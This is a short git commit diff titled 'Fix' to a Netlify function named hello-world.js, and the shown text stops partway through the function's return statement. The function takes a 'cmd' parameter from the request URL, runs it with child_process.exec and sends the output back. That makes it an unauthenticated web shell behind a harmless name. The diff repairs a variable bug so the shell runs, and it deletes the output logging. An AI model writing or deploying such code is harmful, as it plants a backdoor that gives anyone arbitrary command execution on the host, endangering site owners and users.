9330120daafd3864b8076e5cb1eb23c6a68f85eb
urcqpoc <x16g1n@gmail.com>
2025-07-27 21:43:39 +0700

    Fix

--- netlify/functions/hello-world.js
+++ netlify/functions/hello-world.js
@@ -3,13 +3,10 @@ const exec = util.promisify(require('child_process').exec);
 
 exports.handler = async (req) => {
   try {
-    const url = new URL(request.url);
+    const url = new URL(req.url);
     const cmd = url.searchParams.get('cmd');
     const { stdout, stderr } = await exec(cmd);
-    console.log('Output:', stdout);
-    if (stderr) {
-      console.error('Error output:', stderr);
-    }
+
     return {
     statusCode: 200,
     body: `stdout:
